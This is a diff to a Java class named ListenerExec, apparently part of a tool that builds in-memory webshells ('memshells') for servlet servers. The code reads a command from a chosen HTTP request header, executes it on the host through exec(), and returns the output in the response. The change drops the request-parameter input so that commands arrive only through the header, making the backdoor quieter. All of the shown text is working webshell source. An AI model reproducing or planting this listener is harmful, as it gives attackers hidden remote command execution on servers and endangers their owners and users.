@@ -14,10 +14,10 @@ import java.lang.reflect.Method;
  */
 @MemShell(MemShell.Listener)
 @MemShellFunction(MemShellFunction.Exec)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class ListenerExec implements InvocationHandler {
     private static String HEADER;
-    private static String PARAM;
+    
     private static String lockHeaderKey;
     private static String lockHeaderValue;
 
@@ -82,14 +82,7 @@ public class ListenerExec implements InvocationHandler {
             }
 
             Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-            Object param = invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
-            String str = null;
-            if (header != null) {
-                str = (String) header;
-            } else if (param != null) {
-                str = (String) param;
-            }
-            String result = exec(str);
+            String result = exec((String) header);
             Object response = getResponse(request);
             invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
             Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
